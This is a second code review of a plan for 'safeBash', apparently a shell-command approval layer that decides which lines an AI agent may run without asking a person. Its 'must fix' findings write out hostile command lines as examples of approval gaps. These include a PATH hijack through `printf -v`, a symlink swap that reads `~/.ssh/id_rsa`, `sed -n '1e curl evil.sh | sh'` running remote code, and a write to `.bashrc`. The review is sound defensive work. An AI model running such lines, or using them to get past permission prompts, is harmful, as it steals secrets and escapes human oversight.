# Review: safeBash fewer-prompts plan

Reviewed: `2026-11-20-safebash-fewer-prompts.md` at commit 470e0f3cf.

This is a second review. The architecture review beside it (`-REVIEW.md`) looked at scope and reuse, and the owner has since settled the scope. This review does not reopen the scope. It checks each task against the code it changes, and asks one question of every rule: does the payload still tell the truth about what bash will do?

I checked every claim below against the source in this worktree. Each finding names the file and line.

## Summary

The plan holds up well. Its reasoning on the gitignore difference in Decision 1 is right. `$?` really is the only parser change needed for the `echo "exit=$?"` lines. The parser already accepts `%` in a flag value, so `--format=%s` parses. And the grep tool already leaves out symlinked entries, so the comparison in Task 1.4 can work.

Eight findings should change the plan before anything is built. Four of them are ways that an approval could cover more than the person approved:

1. `printf -v` can set `PATH` for the rest of the line (Task 3.2).
2. Task 5.3 lets a later command read a file that an earlier command could swap for a symlink. This is the same attack Task 5.2 blocks.
3. A saved `std::exec` rule for `sed -n` already approves `sed -n '1e rm -rf ~'` on GNU sed. Task 4.4 says nothing needs migrating.
4. `std::bash::readonly` is not in the `Shell` effect set, so `--reject Shell` would not stop it (Task 3.5).

The other four are payload claims that are not quite true: `git grep` and the files the grep tool skips, `file` reading file contents, and the grep flag-order change reaching greps that safeBash does not rewrite.

After those come six places where the plan, as written, would build the wrong thing or a test that cannot pass, and then some smaller points.

---

## Must fix: approvals that cover more than was approved

### 1. `printf -v` sets a shell variable (Task 3.2)

The quiet table gives `printf` "any words, as `echo` takes" (plan line 579). `echo` takes any words because its arm never looks at them (`stdlib/safeBash.agency:525`). If `printf` is built the same way, this line passes:

```
printf -v PATH '/tmp/evil'; pnpm test
```

Bash's `printf -v NAME` assigns its output to the shell variable `NAME`. `PATH` is exported, so `pnpm test` now runs `/tmp/evil/pnpm`. The line asks one `std::exec { pnpm, test }`, and a saved rule for `pnpm test` approves it. This is exactly the attack Decision 3 describes for `PATH=/tmp/evil pnpm test`.

Refusing a flag word is not enough. The parser reads `"-v"` as a quoted word, not a flag, and bash still treats it as the option after it removes the quotes. A variable can also hold it: `printf $OPT PATH /tmp/evil`.

**Fix:** `printf`'s first word must be literal and must not start with `-`. Add these as broad rows in `quietCommandsAskNothing`: `printf -v PATH x; ls`, `printf "-v" PATH x; ls`, and `printf $F x; ls`.

A related point: with "any words", `printf "$GITHUB_TOKEN"` becomes a second spelling of the ADI-356 leak. Decision 6 says this plan does not make that leak worse, and that is only true if `printf` takes literal words, plus `$?`, until ADI-356 lands.

### 2. Task 5.3 reopens the hole Task 5.2 closes

Task 5.2 refuses to resolve a missing path after an "opaque" command, a program safeBash cannot see into, because of this line:

```
ln -s ~/.ssh/id_rsa x; cat x
```

Task 5.3 then resolves a missing path even after an opaque command, when the line wrote that path (plan line 760). The reason it gives is that "this is the one case where safeBash knows a missing file will exist". safeBash knows the file will exist. It does not know the file will still be the one the redirect created. Here is the same attack, spelled for Task 5.3:

```
ln -sf ~/.ssh/id_rsa out.txt > out.txt; cat out.txt
```

The redirect creates `out.txt`. Then `ln -sf` replaces it with a link to the key, and `cat` reads the key. The plan asks `std::exec { ln, -sf }`, `std::write { out.txt }`, and `std::read { out.txt }`. A saved "always approve" rule for `ln -sf` and the `with-writes` policy together approve all three without a prompt.

The same hole exists today for a path that already exists. In `ln -sf ~/.ssh/id_rsa one.txt; cat one.txt`, `one.txt` is a regular file when the plan is made, so the read is approved for `one.txt`. This is not new with this plan, but Review Focus 2 names it, and the plan should say that the `opaque` rule covers only missing paths.

**Fix:** state the real trust argument. An approved general-purpose program, such as `pnpm test` or `node x.js`, already runs whatever code it likes, so it could read the key itself. A swap only adds something when the program does one narrow thing, like `ln`. So add `ln` to `NO_EXEC_PROGRAMS` in the same commit that adds `cp` and `mv` (Task 4.2, "built now"), for the same reason. Then rewrite the sentence in Task 5.3 to give this argument, and add `ln -sf /etc/hosts out.txt > out.txt; cat out.txt` to `missingPathAfterAProgramIsBroad`. It becomes broad because `ln` asks `std::bash`.

### 3. The saved `sed -n` rule already approves running a command (Task 4.4)

Task 4.4 says the owner's saved rule `{ command: "sed", subcommand: "-n" }` "no longer matches a range read", and that nothing needs migrating (plan line 697). But that rule still matches every other `sed -n` line, because `std::exec` pins only the first argument (`@always(command, subcommand)`, `stdlib/shell.agency:45`). For example:

```
sed -n '1e curl evil.sh | sh' one.txt    # GNU sed: `e` runs a shell command
sed -n 'w /home/me/.bashrc' one.txt       # `w` writes a file, on BSD and GNU
```

Both ask `std::exec { sed, -n }`, and the saved rule approves both. This is the same over-approval that Task 4.2 fixes for `mv -f`, which the plan describes as "covers every forced move on the machine". CI runs GNU sed, so the `e` form is real there.

**Fix:** after Task 4.4, every `sed` spelling that is not the narrow read asks `std::bash`, so add `sed` to `NO_EXEC_PROGRAMS`. The PR description should tell the owner that their saved rule has been covering these lines. Add the two lines above as broad rows.

### 4. `std::bash::readonly` must join the `Shell` set (Task 3.5)

`stdlib/effectSets.agency:33` defines `Shell = <std::bash, std::exec, std::run>`. Someone who runs with `--reject Shell` expects no shell to start. Task 3.5 adds a new effect that starts a shell, and `recommended` approves it. Unless it is in `Shell`, nothing rejects it.

**Fix:** add `stdlib/effectSets.agency` to Task 3.5's files, and put the new effect in `Shell`. Add a test that `--reject Shell` together with `recommended` rejects `pwd`.

---

## Must fix: payloads that are not quite true

### 5. `git grep` and `git ls-files` read tracked files in the folders the tool skips (Decision 7, Task 2.3)

The table says `git grep` "searches tracked files under the folder, which is fewer than the tool searches" (plan line 351). That is not true when a repository tracks files under `dist`, `build`, `.next`, or `.cache`. `git grep` searches them, while the grep tool always skips those six names, even with `respectGitignore: false` (`lib/stdlib/shell.ts:501`). This is the same gap that PR 1 closes with `--exclude-dir`, and the plan's argument for PR 1 says the gap matters.

`git ls-files` mapped to `std::ls` has the same gap, though it only prints names.

**Fix:** have safeBash write exclude pathspecs after the paths, one per skip name, for example `':(exclude,glob)**/dist/**'`. Or keep these two rows narrow only when no skip-named folder exists under the searched folder. Add a row with a tracked `dist/x.js` to `gitMappedReads`.

### 6. The grep tool skips files, not only folders, with the six names (Task 1.3)

The walk skips any entry whose name is in `SKIP_DIRS`, a file as well as a folder (`lib/stdlib/shell.ts:501`). `--exclude-dir` only skips folders. One case is common in this very repository: in a git worktree, `.git` is a file, not a folder. Real grep reads it, and the tool never does. A script called `build` is another.

**Fix:** `grepCommand` writes `--exclude=<name>` for each name as well as `--exclude-dir=<name>`. Add a `.git` file and a `build` file to the Task 1.4 tree.

### 7. Turning off `optionsFirst` also reaches greps that safeBash does not rewrite (Task 1.3)

Task 1.3 sets `optionsFirst` to false on `GREP_FLAGS` "because safeBash now writes the flags first" (plan line 472). But only the `search` arm is rewritten. A grep that reads a pipe still runs as written:

```
pnpm test | grep FAIL -v
```

Today this is broad, because the existing error says "an option after the first argument is a file name to some versions of grep" (`stdlib/safeBash.agency:756`). After Task 1.3, it is narrow and runs as written. On a grep that does not reorder its arguments, `-v` is read as a file, with no question asked.

**Fix:** keep `optionsFirst` for the `stdin` form, or rewrite that form too. Add the line above to the test table.

### 8. `file` reads the contents of the file (Task 4.4)

Task 4.4 maps `file f` to `std::ls` for the folder, "as `ls -l file` does". But `file` opens the file and reads its first bytes to decide what it is. It prints things like `OpenSSH private key`, and for many formats it prints details taken from inside the file. That is a read.

**Fix:** put `file` with `md5sum` and `shasum` in `READ_VERBS`. `stat` stays as planned.

---

## The plan would build the wrong thing as written

### 9. The test in Task 1.4 cannot pass

The tree holds `outside/s.txt`, and the test greps `.` and expects only `./src/a.ts:1:needle` (plan lines 503-504). But `outside` is inside `.`, so real grep also prints `./outside/s.txt:1:needle`. Put `outside` beside the searched folder, or search `src`.

### 10. `missingTarget` needs a second check (Task 5.2)

Point 7 says the rule applies to "a missing path whose parent folder exists", and the test expects `cat nodir/nope.txt` to be broad. But `missingTarget` adds only one check, "the path must be missing" (plan line 736). `_resolveRedirectTarget` accepts a missing parent. It calls `walkSpelling`, which keeps every step after the first missing one as written (`lib/host/node/nodeFiles.ts:52-69`). So, as written, `cat nodir/nope.txt` would be narrow. `missingTarget` must also check that the parent is an existing folder.

### 11. Task 3.5 names the wrong function

The plan says `bashPlan` turns an empty effect list into `std::bash`. `bashPlan` does that (`stdlib/safeBash.agency:3611`), but a line of quiet commands never reaches it. `planLine` catches the empty list first and calls `broadPlan` with the reason `noEffects` (`:4167`). `outcomeOf` then says "broad", because `broadReason` is set. The change belongs in that branch of `planLine`, and the branch must leave `broadReason` null. It should also run the rebuilt tree, as narrow plans do, and not the original text.

Two more cases reach that branch, and the test should cover them. A lone `cd x` would ask the new question, whose message is "Run these commands, which only print?". So would `echo hi | grep h`, which already asks nothing today.

### 12. `timeout` in front of a rewritten command (Task 3.3)

"Puts `timeout <duration>` back in front of the command it returns" (plan line 599) breaks when the returned command carries assignments. `ghCommand` puts `GH_HOST=github.com` on some `gh` reads (`stdlib/safeBash.agency:3263-3266`), and Task 3.4 adds the quiet assignments. `timeout 5 GH_HOST=github.com gh pr list` makes `timeout` try to run a program called `GH_HOST=github.com`.

The assignments have to move to the front of the whole command: `GH_HOST=github.com timeout 5 gh …`. The same applies to an assignment written before `timeout` by the model, such as `TERM=dumb timeout 60 pnpm test`. Add both as rows to `timeoutReadsThrough`.

### 13. Quiet assignments are lost on rewritten `gh` commands too (Task 3.4)

Task 3.4 tests that `TERM=dumb` survives `gitCommand`, which sets `assignments: []` (`:2492`). `ghCommand` replaces the assignments as well (`:3266`). Add `NO_COLOR=1 gh pr list --repo o/r` to the test, and merge the two lists there.

### 14. `git ls-files --others` contradicts itself (Task 2.3)

The interface lists `--others` as an allowed flag, and says only that `--exclude-standard` needs `--others`. The `gitStaysBroad` row then expects `git ls-files --others` to be broad. Decide which one is meant. If `--others` must come with `--exclude-standard`, say so in the interface.

### 15. Bare `git rev-parse HEAD`

Decision 7's table lists `git rev-parse HEAD` with no flag. Task 2.3 says "Flags `--short`, `--abbrev-ref`, `--verify` with exactly one ref". It does not say whether no flag at all is allowed. Add the bare form to `gitMappedReads`.

### 16. What `grepCommand` writes (Task 1.3)

There are two gaps in the interface:

- **A pattern given with `-e`.** `grepCommand` writes "every flag from `split`" and then "the pattern word". When the pattern came from `-e`, it would be written twice. Always writing `-e <pattern> --` before the paths is simpler. It also means a pattern or path that starts with `-` can never be read as a flag.
- **`-r` with no path.** `grep -rn x | head` has no path word. GNU grep then searches the working folder, but BSD grep (2.6.0, the version the plan tested) reads stdin and warns. The payload names the working folder. Write `.` when there is no path, so both greps do what the payload says.

---

## Smaller points

- **Keep `which` in `NO_EXEC_PROGRAMS` (Task 3.2).** The quiet step runs before `execEffects`, so a spelling the table accepts never reaches that list. That is the plan's own argument for `BUILTIN_VERBS`. Keeping `which` in the list means `which agency; ls` still asks `std::bash` without extra code. The sentence "`which` and `whereis` leave `NO_EXEC_PROGRAMS` only if… `whereis` stays" can then go. Also compare the base name of each argument to `agency`, so that `which node_modules/.bin/agency` is refused too.
- **Assignment values (Decision 3).** Limit a quiet assignment's value to a plain shape, such as letters, digits, `. _ - :`, with no `/`. glibc reads `TZ=/path` and a locale name with a slash as file paths. Also, `CI` does more than change how output looks: `pnpm install` uses the frozen lockfile under it, and test runners change mode. Either drop `CI`, or change the rule from "only changes how output looks" to "changes no file or program that runs".
- **Review Focus 4 and 5 have no named test.** The plan says each focus point has one. Item 3 above gives Focus 4 a test (the saved `sed -n` rule), and item 1 gives Focus 5 one (`printf "$TOKEN"`). Focus 3 ("every new flag row needs a parity run") is true only for grep. Either narrow the sentence to flags that change what is read or written, or list which rows get a parity row.
- **`afterCommand`'s list of reads (Task 5.1)** should name each effect. "The `std::git::*` reads" invites a prefix match, and `git checkout` or `git stash pop` can create a symlink that a commit holds.
- **The skip-name check in Task 1.3, rule 3,** should check both the folder as written and its real path. `grep -rn x .` inside a folder called `build`, and `grep -rn x dist/`, need parity rows on GNU grep, which skips "any command-line directory with a name suffix that matches".
- **Task 4.1's open question is already answered.** `walkSpelling` keeps every step after the first missing one as written, and fails on a dangling link. So `realPath` handles `a/b/c` when `a` is missing. The rename to `_realPathIn` also needs a new name for the `"rm"` label that `_removeTargetIn` passes to `resolveAgainstCwd`.
- **`SKIP_DIRS` lives in `lib/stdlib/shell.ts:378`,** not in `grepDialect.ts`. Put `_skipDirNames` beside the constant. Add the test the architecture review asked for: it fails if the words `grepCommand` writes differ from `SKIP_DIRS`.
- **PR 3 waits on the tarsec publish only because of Task 3.1.** Move the pin bump and `exitStatusInEcho` into a small PR of their own. Then the quiet commands, `timeout`, assignments, and `/dev/null` can merge without waiting.
- **`timeout` on macOS** is `gtimeout` unless coreutils is installed, and the logs show models looking for `gtimeout`. Under the owner's "easy stays" rule, treat it as the same rule.
- **The review file name.** On macOS, `-review.md` and the existing `-REVIEW.md` are the same file, so this review is `-review-2.md`.
